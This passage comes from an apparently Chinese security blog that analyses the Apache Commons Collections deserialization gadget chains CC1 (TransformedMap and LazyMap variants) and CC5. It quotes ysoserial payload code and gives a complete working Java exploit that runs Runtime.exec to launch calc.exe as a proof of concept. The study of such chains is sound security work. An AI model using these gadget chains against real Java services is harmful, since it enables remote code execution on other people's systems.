class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        Map transformedMap=  TransformedMap.decorate(innerMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//通过反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16890850784115.png"
                      alt="企业微信截图_16890850784115"
                ></p>
<h2 id="ysoserial的LazyMap链"><a href="#ysoserial的LazyMap链" class="headerlink" title="ysoserial的LazyMap链"></a>ysoserial的LazyMap链</h2><p>和我们上面构造的链不同，在ysoserial中使用的是<code>LazyMap</code>而非<code>TransformedMap</code></p>
<p>看一下<code>ysoserial CommonsCollections1</code>是如何实现的（注：代码中的<code>new ConstantTransformer(1)</code>并没有实际作用）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们需要重点关注以下三行代码干了什么，很明显他们是反序列化的核心。逐行来进行分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br></pre></td></tr></table></figure>

<p><strong>第一行：</strong></p>
<p><code>LazyMap.decorate()</code>用来返回<code>LazyMap</code>实例化对象。既然使用了<code>LazyMap</code>替换<code>TransformedMap</code>，那就说明在<code>LazyMap</code>中存在某个方法，可以像<code>TransformedMap.put()</code>和<code>TransformedMap.checksetValue()</code>一样调用了<code>ChainedTransformer.transform()</code>。</p>
<p>通过构造方法发现<code>ChainedTransforme</code>变为了<code>this.factory</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看类中的方法发现<code>LazyMap.get()</code>调用了<code>ChainedTransformer.transform()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说在反序列化的时候，<code>readObject()</code>方法通过某种方法调用了<code>LazyMap.get()</code></p>
<p><strong>第二行：</strong></p>
<p>继续往下看<code>final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code>，跟一下该方法，发现实际调用的是<code>Gadgets.createProxy()</code>，并且对<code>map</code>调用了<code>Gadgets.createMemoizedInvocationHandler()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下<code>Gadgets.createMemoizedInvocationHandler()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>ANN_INV_HANDLER_CLASS</code>是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230712213012458.png"
                      alt="image-20230712213012458"
                ></p>
<p><code>Reflections.getFirstCtor()</code>方法是在获取<code>AnnotationInvocationHandler</code>的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    setAccessible(ctor);</span><br><span class="line">    <span class="keyword">return</span> ctor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例化时传入的第一个参数<code>Override.class</code>时Java中的注解类，和我们上面构造链时用的<code>Retention.class</code>类似，不过<code>Override</code>内部没有成员变量。</p>
<p>也就是说<code>Gadgets.createMemoizedInvocationHandler()</code>将<code>AnnotationInvocationHandler</code>进行了实例化，第一个参数为<code>Override.class</code>，第二个参数为<code>LazyMap</code>。</p>
<p>回来看<code>Gadgets.createProxy()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iface</code>此时是<code>Map.class</code>，<code>iface.cast()</code>方法是将传递进来的实例化类再返回出去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public T cast(Object obj) &#123;</span><br><span class="line">    if (obj != null &amp;&amp; !isInstance(obj))</span><br><span class="line">        throw new ClassCastException(cannotCastMsg(obj));</span><br><span class="line">    return (T) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了<code>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</code>方法，在Java中该方法用来生成动态代理类。关于动态代理的内容，以后再说。这里只需要知道由<code>Proxy.newProxyInstance(...)</code>生成的代理类，在使用类中的方法时会调用第三个参数<code>InvocationHandler h</code>中的<code>invoke()</code>方法，而在这里的参数是实例化后的<code>AnnotationInvocationHandler</code>。</p>
<p>我们看一下<code>AnnotationInvocationHandler.invoke()</code>，发现其调用了<code>LazyMap.get()</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230712215118686.png"
                      alt="image-20230712215118686"
                ></p>
<p>简单来说，<code>final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code>这行代码生成了一个代理类<code>mapProxy </code>，<code>readObject()</code>调用代理类中的方法时，会调用<code>AnnotationInvocationHandler.invoke()</code>，进一步调用<code>LazyMap.get()</code></p>
<p><strong>第三行：</strong></p>
<p>再往后看代码是<code>final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</code>。<code>Gadgets.createMemoizedInvocationHandler()</code>上面已经分析过了：将<code>AnnotationInvocationHandler</code>实例化，<code>mapProxy </code>为实例化时的第二个参数。这里为什么又将<code>AnnotationInvocationHandler</code>实例化一遍？并且根据<code>ysoserial </code>后面的代码发现，实例化后的对象就是我们要序列化的对象。</p>
<p>为了方便将两个<code>AnnotationInvocationHandler</code>进行区分，我们根据参数不同，将他们分别命名为<code>AnnotationInvocationHandler_mapProxy</code>和<code>AnnotationInvocationHandler_lazyMap</code>。<code>AnnotationInvocationHandler_mapProxy</code>是我们进行序列化的。</p>
<p>反序列化时，会执行<code>AnnotationInvocationHandler_mapProxy.readObject()</code>，进而调用<code>mapProxy.entrySet()</code>，然后调用<code>AnnotationInvocationHandler_lazyMap.invoke()</code>，最后调用<code>lazyMap.get()</code>来执行任意命令。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230712222424010.png"
                      alt="image-20230712222424010"
                ></p>
<h3 id="构造LazyMap-CommonsCollections1"><a href="#构造LazyMap-CommonsCollections1" class="headerlink" title="构造LazyMap CommonsCollections1"></a>构造LazyMap CommonsCollections1</h3><p>通过前面的分析，知道了<code>LazyMap CommonsCollections1</code>的整个流程。我们尝试自己来使用<code>LazyMap</code>写一下CC1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.AnnotatedElement;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建LasyMap</span></span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler实例化</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">//创建AnnotationInvocationHandler代理类</span></span><br><span class="line">        Map aihProxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aih);</span><br><span class="line">        <span class="comment">//由代理类生成新的AnnotationInvocationHandler</span></span><br><span class="line">        InvocationHandler handler= (InvocationHandler) constructor.newInstance(Override.class,aihProxy);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现顺利弹计算器，但是运行时产生的错误是为什么？这个确实没了解到。似乎牵扯到了代理里面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230712230921865.png"
                      alt="image-20230712230921865"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>TransformedMap:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230803174915093.png"
                      alt="image-20230803174915093"
                ></p>
<p>LazyMap:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230803181744574.png"
                      alt="image-20230803181744574"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections5和CommonsCollections7</title>
    <url>/2023/09/11/CommonsCollections5%E5%92%8CCommonsCollections7/</url>
    <content><![CDATA[<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>还是从ysoserial中的代码入手，可以发现代码中引入了新类：<code>BadAttributeValueExpException</code>，且很明显该类即反序列化所调用的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">	        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">	<span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">				String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">				<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">				Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">				<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">	<span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">	<span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">       Reflections.setAccessible(valfield);</span><br><span class="line">	valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">	Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p><code>BadAttributeValueExpException</code>是 Java 中的一个异常类，用于表示由于无效的属性值导致的异常情况。通常与 Java 命名、目录接口（JNDI）或 LDAP（轻量级目录访问协议）相关，用于处理目录服务中的属性。</p>
<p>在上面代码中除了<code>BadAttributeValueExpException</code>，同时还用到了<code>TiedMapEntry</code>。</p>
<p>回忆CC6中<code>TiedMapEntry</code>调用链为：</p>
<blockquote>
<p> <code>TiedMapEntry#hashCode()</code>-&gt;<code>TiedMapEntry#getValue()</code>-&gt;<code>LazyMap#get()</code></p>
</blockquote>
<p>因此可以确定在<code>BadAttributeValueExpException#readObject()</code>中会直接或者间接的调用<code>TiedMapEntry#getvalue()</code>。在这里<code>TiedMapEntry</code>为<code>BadAttributeValueExpException</code>成员变量<code>val</code></p>
<p>查看<code>readObject()</code>，很明显<code>valObj</code>即<code>TiedMapEntry</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中<code>valObj.toString()</code>即<code>TiedMapEntry.toString()</code>。</p>
<p>查看<code>TiedMapEntry#toString()</code>：可以看到在这里执行了<code>TiedMapEntry#getValue()</code></p>
